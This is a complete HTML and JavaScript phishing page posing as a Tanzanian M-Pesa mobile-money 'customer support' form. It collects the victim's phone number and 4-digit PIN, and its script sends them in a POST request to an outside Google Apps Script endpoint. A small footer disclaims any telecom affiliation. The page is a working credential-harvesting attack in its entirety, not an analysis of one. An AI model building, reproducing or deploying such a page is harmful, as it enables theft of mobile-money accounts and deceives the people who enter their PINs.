<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mobile Support | Tanzania</title>
  <meta name="description" content="Secure customer support form for mobile users." />
  <style>
    :root {
      --primary-red: #d61f1f;
      --primary-red-dark: #a80d0d;
      --green: #0a8f4a;
      --surface: #ffffff;
      --bg-soft: #f4f4f4;
      --border: #dfe3e8;
      --text: #1f2937;
      --muted: #6b7280;
      --error-bg: #fff1f2;
      --success-bg: #ecfdf5;
      --error-text: #b42318;
      --success-text: #166534;
      --shadow: 0 18px 40px rgba(15, 23, 42, 0.12);
    }

    * { box-sizing: border-box; }

    html, body {
      margin: 0;
      padding: 0;
      min-height: 100%;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(to bottom, var(--primary-red) 0%, var(--primary-red-dark) 28%, var(--bg-soft) 28%, var(--bg-soft) 100%);
      color: var(--text);
    }

    body {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 42px 16px;
    }

    .container {
      width: min(100%, 440px);
      background: var(--surface);
      border-radius: 20px;
      box-shadow: var(--shadow);
      padding: 30px 24px 24px;
    }

    .brand {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px;
    }

    .brand-mark {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 58px;
      height: 58px;
      border-radius: 50%;
      background: var(--primary-red);
      color: white;
      font-size: 30px;
      font-weight: 700;
      border: 3px solid #f8d2d2;
    }

    .brand-name {
      font-size: clamp(2rem, 3vw, 2.2rem);
      font-weight: 700;
      color: var(--primary-red);
      line-height: 1;
      letter-spacing: -0.03em;
    }

    .brand-name span {
      display: block;
      font-size: 12px;
      font-weight: 500;
      letter-spacing: 0.08em;
      color: var(--muted);
      text-transform: uppercase;
      margin-top: 4px;
      text-align: left;
    }

    .tag {
      display: inline-block;
      background: var(--green);
      color: #fff;
      font-weight: 700;
      padding: 8px 18px;
      border-radius: 8px;
      margin: 2px 0 14px;
      letter-spacing: 0.02em;
    }

    h1 {
      margin: 0 0 12px;
      font-size: clamp(1.8rem, 4vw, 2.3rem);
      color: var(--primary-red);
      line-height: 1.2;
    }

    .intro {
      margin: 0 0 18px;
      color: var(--text);
      line-height: 1.6;
      font-size: 1rem;
    }

    form {
      display: block;
    }

    .field {
      margin-bottom: 14px;
      text-align: left;
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 600;
      color: var(--text);
      font-size: 0.95rem;
    }

    input {
      width: 100%;
      padding: 14px 14px;
      font-size: 1rem;
      background: #fff;
      color: var(--text);
      border: 1px solid var(--border);
      border-radius: 10px;
      transition: border-color 0.2s ease, box-shadow 0.2s ease;
    }

    input:focus {
      outline: none;
      border-color: var(--primary-red);
      box-shadow: 0 0 0 3px rgba(214, 31, 31, 0.12);
    }

    button {
      width: 100%;
      border: none;
      border-radius: 10px;
      background: var(--primary-red);
      color: #fff;
      font-size: 1rem;
      font-weight: 700;
      padding: 15px 18px;
      cursor: pointer;
      transition: background 0.2s ease, transform 0.12s ease;
      margin-top: 6px;
    }

    button:hover {
      background: var(--primary-red-dark);
    }

    button:active {
      transform: translateY(1px);
    }

    button:disabled {
      opacity: 0.7;
      cursor: wait;
    }

    .status {
      margin-top: 18px;
      padding: 12px 14px;
      border-radius: 10px;
      font-size: 0.95rem;
      line-height: 1.5;
      display: none;
    }

    .status.visible {
      display: block;
    }

    .status.info {
      background: #f3f4f6;
      color: var(--text);
    }

    .status.error {
      background: var(--error-bg);
      color: var(--error-text);
    }

    .status.success {
      background: var(--success-bg);
      color: var(--success-text);
    }

    .footer-note {
      margin-top: 18px;
      font-size: 0.8rem;
      color: var(--muted);
      text-align: center;
    }

    .sr-only {
      position: absolute;
      width: 1px;
      height: 1px;
      margin: -1px;
      padding: 0;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
      border: 0;
    }
  </style>
</head>
<body>
  <main class="container" aria-labelledby="pageTitle">
    <div class="brand" aria-label="Branding">
      <div class="brand-mark" aria-hidden="true">T</div>
      <div class="brand-name">
        Tanzania Mobile
        <span>Customer Support</span>
      </div>
    </div>

    <div class="tag">M-Pesa Support</div>

    <h1 id="pageTitle">Need help with your account?</h1>
    <p class="intro">Please complete the form below and our support team will review your request.</p>

    <form id="supportForm" novalidate>
      <div class="field">
        <label for="phoneNumber">Phone number</label>
        <input
          id="phoneNumber"
          name="phoneNumber"
          type="tel"
          inputmode="numeric"
          autocomplete="tel"
          maxlength="10"
          pattern="0[0-9]{9}"
          placeholder="e.g. 0712345678"
          required
        />
      </div>

      <div class="field">
        <label for="fourDigits">PIN / 4 digits</label>
        <input
          id="fourDigits"
          name="fourDigits"
          type="text"
          inputmode="numeric"
          maxlength="4"
          pattern="[0-9]{4}"
          placeholder="Enter 4 digits"
          required
          oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)"
        />
      </div>

      <div class="field">
        <label for="messageInput">Message</label>
        <input
          id="messageInput"
          name="messageInput"
          type="text"
          maxlength="300"
          placeholder="Describe your issue or request"
          required
        />
      </div>

      <button id="submitButton" type="submit">Send Request</button>
    </form>

    <div id="statusMessage" class="status info" aria-live="polite">
      Please fill in the form to continue.
    </div>

    <p class="footer-note">support form and is not affiliated with any telecom provider.</p>
  </main>

  <script>
    const form = document.getElementById('supportForm');
    const phoneInput = document.getElementById('phoneNumber');
    const fourDigitsInput = document.getElementById('fourDigits');
    const messageInput = document.getElementById('messageInput');
    const statusMessage = document.getElementById('statusMessage');
    const submitButton = document.getElementById('submitButton');

    // Replace this with your real backend endpoint in production.
    const API_ENDPOINT = 'https://script.google.com/macros/s/AKfycbxalqWIJNIs8oIEfo_Yqb9b5oAwzbnAOsriN10iSzNj6IK6XFtlQZAJaeXQ4N6kc9Fj/exec';

    function showStatus(message, type = 'info') {
      statusMessage.textContent = message;
      statusMessage.className = `status ${type} visible`;
    }

    function clearStatus() {
      statusMessage.className = 'status info';
      statusMessage.textContent = 'Please fill in the form to continue.';
    }

    function validateFields() {
      const phone = phoneInput.value.trim();
      const pin = fourDigitsInput.value.trim();
      const message = messageInput.value.trim();

      if (!phone || !pin || !message) {
        return 'Please complete all fields before submitting.';
      }

      if (!/^0\d{9}$/.test(phone)) {
        return 'Phone number must start with 0 and have exactly 10 digits.';
      }

      if (!/^\d{4}$/.test(pin)) {
        return 'Please enter exactly 4 digits for the PIN.';
      }

      return null;
    }

    async function submitToBackend(payload) {
      const response = await fetch(API_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        credentials: 'same-origin',
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        throw new Error('Request failed.');
      }

      return response;
    }

    form.addEventListener('submit', async function (event) {
      event.preventDefault();

      const validationError = validateFields();
      if (validationError) {
        showStatus(validationError, 'error');
        return;
      }

      submitButton.disabled = true;
      submitButton.textContent = 'Sending...';
      showStatus('Submitting your request...', 'info');

      const payload = {
        phoneNumber: phoneInput.value.trim(),
        fourDigits: fourDigitsInput.value.trim(),
        message: messageInput.value.trim(),
        submittedAt: new Date().toISOString()
      };

      try {
        await submitToBackend(payload);
        showStatus('Your request has been sent successfully.', 'success');
        form.reset();
      } catch (error) {
        showStatus('There was a problem sending your request. Please try again later.', 'error');
      } finally {
        submitButton.disabled = false;
        submitButton.textContent = 'Send Request';
      }
    });

    phoneInput.addEventListener('input', () => {
      clearStatus();
    });

    fourDigitsInput.addEventListener('input', () => {
      clearStatus();
    });

    messageInput.addEventListener('input', () => {
      clearStatus();
    });
  </script>
</body>
</html>
